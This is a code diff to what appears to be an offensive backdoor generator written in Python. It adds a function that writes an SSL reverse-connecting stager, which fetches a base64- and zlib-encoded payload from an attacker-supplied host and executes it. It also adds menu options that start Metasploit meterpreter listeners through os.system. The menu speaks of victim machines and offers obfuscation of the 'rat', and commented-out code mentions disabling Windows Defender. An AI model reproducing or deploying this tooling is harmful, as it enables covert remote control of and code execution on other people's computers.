@@ -227,6 +227,34 @@ main()
         ina.close
         print('(*) Generated Backdoor and saved as '+name)
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
+def gen_rev_ssl_tcp():
+    global name
+    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
+    host = input('Please enter the ip you wish the backdoor to connect back to: ')
+    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
+    with open(name, 'a+') as ina:
+        ina.write('port = '+str(port)+'\n')
+        ina.write("\n")
+        ina.write('hototo = "'+str(host)+'"')
+        b = '''
+import zlib,base64,ssl,socket,struct,time
+for x in range(10):
+	try:
+		so=socket.socket(2,1)
+		so.connect((hototo,port))
+		s=ssl.wrap_socket(so)
+		break
+	except:
+		time.sleep(10)
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)<l:
+	d+=s.recv(l-len(d))
+exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+'''
+        ina.write(b)
+        ina.close
+        print('(*) Generated Backdoor and saved as '+name)
 def postgen():
     opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
     if opt_obf == 'y':
@@ -251,7 +279,8 @@ print("""
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
         3. Create Reverse Meterpreter (HTTP) (Connects back to you)
-        4. Open a listener
+        4. Create Encrypted TCP Meterpreter (SSL) connects back to you
+        5. Open a listener
         
 
 """)  
@@ -266,10 +295,21 @@ if nscan == "2":
 if nscan == "3":
     gen_rev_http()
     postgen()
-if nscan == '4':
+    port=input('Please enter the port you want to listen on: ')
+    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+    os.system(a)
+if nscan == "4":
+    gen_rev_ssl_tcp()
+    postgen()
+    port=input('Please enter the port you want to listen on: ')
+    a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
+    os.system(a)
+if nscan == '5':
     disable_defender = False
     #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
     #if opt_mods == 'y':
     #    disable_defender = True
     port = int(input('Please enter the port u want to listen on: '))
     listen('0.0.0.0', port)
+else:
+    print('Please select a vaild option')
